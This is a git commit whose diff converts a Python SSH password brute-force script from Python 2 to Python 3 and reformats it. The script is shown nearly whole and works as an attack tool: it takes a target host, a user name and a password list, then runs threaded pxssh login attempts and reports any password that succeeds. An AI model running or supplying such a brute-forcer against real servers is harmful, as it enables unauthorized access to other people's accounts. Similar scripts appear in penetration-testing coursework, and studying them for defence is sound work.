6778d503921bb3ad60e46a7714860403d5a9ac2b
antoh <anthony.holderbaum@timeonegroup.com>
2019-04-25 16:04:42 +0200

    feat: menage

--- sshPasswordBruteforce.py
+++ sshPasswordBruteforce.py
@@ -9,53 +9,61 @@ connection_lock = threading.BoundedSemaphore(value=maxConnections)
 Found = False
 Fails = 0
 
+
 def connect(host, user, password, release):
     global Found
     global Fails
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print '[+] Password found : '+ password
+        print("[+] Password found : " + password)
         Found = True
-    except Exception, e:
-        if 'read_nonblocking' in str(e):
+    except Exception as e:
+        if "read_nonblocking" in str(e):
             Fails += 1
             time.sleep(5)
             connect(host, user, password, False)
-        elif 'synchronize with original prompt' in str(e):
+        elif "synchronize with original prompt" in str(e):
             time.sleep(1)
             connect(host, user, password, False)
     finally:
-        if release: connection_lock.release()
+        if release:
+            connection_lock.release()
+
 
 def main():
-    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
-    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
-    parser.add_option('-u', dest='user', type='string', help='specify user name')
-    parser.add_option('-F', dest='passwdFile', type='string', help='specify the password file')
+    parser = optparse.OptionParser(
+        "usage%prog -H <target host> -u <user> -F <password list>"
+    )
+    parser.add_option("-H", dest="tgtHost", type="string", help="specify target host")
+    parser.add_option("-u", dest="user", type="string", help="specify user name")
+    parser.add_option(
+        "-F", dest="passwdFile", type="string", help="specify the password file"
+    )
     (options, args) = parser.parse_args()
     host = options.tgtHost
     passwdFile = options.passwdFile
     user = options.user
     if host == None or user == None or passwdFile == None:
-        print parser.usage
+        print(parser.usage)
         exit(0)
 
-    fn = open(passwdFile, 'r')
+    fn = open(passwdFile, "r")
 
     for line in fn.readlines():
         if Found:
-            print '[*] Exiting: Password found'
+            print("[*] Exiting: Password found")
             exit(0)
         if Fails > 5:
-                print '[!] Exiting: Too Many Socket Timeouts'
-                exit(0)
+            print("[!] Exiting: Too Many Socket Timeouts")
+            exit(0)
 
         connection_lock.acquire()
-        password = line.strip('\r').strip('\n')
-        print '[-] Testing: ' + str(password)
+        password = line.strip("\r").strip("\n")
+        print("[-] Testing: " + str(password))
         t = threading.Thread(target=connect, args=(host, user, password, True))
         t.start()
-        
+
+
 if __name__ == "__main__":
     main()
